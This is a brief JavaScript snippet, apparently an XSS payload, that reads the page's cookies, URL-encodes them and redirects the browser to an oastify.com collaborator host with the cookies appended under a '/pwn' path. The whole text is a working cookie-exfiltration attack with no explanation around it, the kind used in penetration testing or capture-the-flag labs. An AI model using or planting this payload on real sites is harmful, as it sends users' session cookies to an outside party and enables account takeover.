
var content = document.cookie;

// Encode the DOM content for URL
var encoded = encodeURIComponent(content);

window.location.replace("https://c8lgzsk4wd1wfi8hwcipb9vap1vsjji77.oastify.com/pwn?cookies=" + encoded)
